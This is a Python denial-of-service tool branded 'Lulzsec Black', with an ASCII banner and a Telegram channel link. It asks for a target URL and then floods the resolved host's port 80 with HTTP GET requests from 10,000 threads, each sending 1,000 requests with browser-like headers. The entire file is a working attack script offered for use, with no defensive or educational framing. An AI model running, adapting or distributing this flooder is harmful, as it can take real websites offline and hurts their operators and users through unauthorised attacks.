import socket
import threading
import pyfiglet
from colorama import init, Fore, Style
import random
import time

# Initialize colorama
init()

# Function for GET request attack
def get_attack(target_ip, target_port, num_requests):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))

        # Prepare GET request
        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
        request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate, br\r\n"
        request += "Connection: keep-alive\r\n\r\n"

        # Send multiple requests
        for _ in range(num_requests):
            client.send(request.encode())

        print(f"{Fore.GREEN}[+] Sent {num_requests} GET requests to {target_ip}:{target_port}{Style.RESET_ALL}")

        # Optionally, receive response
        # response = client.recv(4096)
        # print(f"Response: {response.decode()}")

        client.close()
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

# Function for launching GET attack with multiple threads
def launch_get_attack(target_ip, target_port, num_threads, num_requests_per_thread):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=get_attack, args=(target_ip, target_port, num_requests_per_thread))
        thread.start()
        threads.append(thread)
        time.sleep(0.01)  # Small delay to spread out thread starts
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("Lulzsec Black")
    print(f"{Fore.RED}{ascii_banner}{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}Welcome to Lulzsec Black{Style.RESET_ALL}")

    # Add additional messages
    print(f"{Fore.GREEN}This tool was made by a team Lulzsec Black{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Link to our team channel on Telegram: \033[4mhttps://t.me/Luzsec_Black\033[0m{Style.RESET_ALL}")

    target_url = input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    target_ip = socket.gethostbyname(target_url.split('//')[1].split('/')[0])
    target_port = 80  # Default HTTP port
    num_threads = 10000
    num_requests_per_thread = 1000

    print(f"{Fore.YELLOW}Launching GET attack on {target_ip}:{target_port} with {num_threads} threads and {num_requests_per_thread} requests per thread...{Style.RESET_ALL}")
    launch_get_attack(target_ip, target_port, num_threads, num_requests_per_thread)

